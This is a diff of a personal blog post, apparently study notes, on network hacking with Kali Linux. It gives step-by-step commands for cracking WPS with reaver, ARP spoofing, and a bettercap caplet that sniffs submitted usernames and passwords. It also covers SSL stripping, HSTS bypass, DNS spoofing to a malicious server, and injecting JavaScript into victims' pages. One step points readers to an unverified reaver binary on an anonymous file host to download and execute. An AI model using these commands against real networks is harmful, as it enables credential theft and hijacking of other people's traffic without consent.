@@ -1,4 +1,4 @@
-Title: Hacking with Kali Linux
+Title: Network Hacking with Kali Linux
 Date: 2020-05-xx
 Author: Jack McKew
 Category: Software
@@ -69,7 +69,7 @@ For cracking WPA or WPA2, look out for WPS, this will enable the hack to much si
 #### With WPS
 
 1. to find all networks with WPS enabled use `wash --interface [WirelessAdapter]`
-2. to attack a network with WPS: 
+2. to attack a network with WPS:
     1. run fake auth on the router `aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]` + leave airodump-ng in background (see WEP step 1)
     2. use reaver `reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate`
         > if reaver doesn't work use this version of reaver <https://ufile.io/lro4nkdv> make sure you run `chmod +x reaver` then `./rever [your command here]`
@@ -105,7 +105,7 @@ Need to gather information (MAC, IP etc.), there are programs that do for you = 
 ##### NetDiscover
 
 - to use NetDiscover `netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]`
-- use your ip address with the last .xx being .1 
+- use your ip address with the last .xx being .1
 - if using wireless card use `-i [wirelessCard]` before `-r` or just connect to the network.
 - if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)
     - `netdiscover -i <interface> <gateway IP/8>`
@@ -137,3 +137,45 @@ Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresse
     - There is also a tool called bettercap (more features).
     - ARPspoof is not default installed use `apt-get update && apt-get install -y dsniff`
 - Packets will be blocked by default on linux to allow packets to flow though on linux use `echo 1 > /proc/sys/net/ipv4/ip_forward` (echo 0 to revert)
+
+##### BetterCap
+
+- use `bettercap -iface [interface]` (interface must be connected to the network you wish to attack)
+    - use help to get info of modules running or help [module for more]
+- `net.probe on` gets all clients
+- `net.show` shows all clients
+- To do Man in the middle in Bettercap use `help arp.spoof` you need to modify some of the options, to do this use `set [option_name] [value]` (set full.duplux on and set targets in .targets)
+- once settings have been set up turn it on `arp.spoof on`
+- To capture data that is being spoofed and analyse it use the net.sniff module `net.sniff on` , you will see entered usernames and passwords under POST
+- Instead of doing the above you can use a caplet, to capture data for you
+    1. open a text file and type each command
+        - `net.probe on`
+        - `set arp.spoof.fullduplex true`
+        - `set arp.spoof.targets [target_ips]` (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP)
+        - `arp.spoof on`
+        - `net.sniff on`
+    2. Save the file with .cap
+    3. From Bash use `bettercap -iface [interface] -caplet [filename]`
+
+#### HTTPS
+
+HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called `SSL Strip`. BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use `hstshijack`, which a resource for this is at <https://github.com/bettercap/caplets/tree/master/hstshijack>.
+
+#### DNS Spoofing
+
+Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use `service apache2 start` go to KALI's IP to use. The default webpage is stored in /var/www/html.
+
+To spoof:
+
+1. Start bettercap with the caplet coded above
+2. Use the dns.spoof module:
+    1. if you do not want to redirect to yourself change the dns.spoof.address value
+    2. set dns.spoof.all so bettercap responds to any dns request `set dns.spoof.all true`
+    3. set dns.spoof.domains to the sites you wish to be redirected to you. `set dns.spoof.domains [domain1, domain2]` (use \* as a wildcard to do any subdoamin under a website eg.*.kali.org)
+    4. start dns.spoof `dns.spoof on`
+
+How to insert javascript code:
+
+1. Have javascript code file 
+2. go to the hstshijack plugin /usr/share/bettercap/caplets
+3. go to the .cap file and add the js code under the payloads, \* means all domains then : eg. *:/code.js (otherwise use a domain).
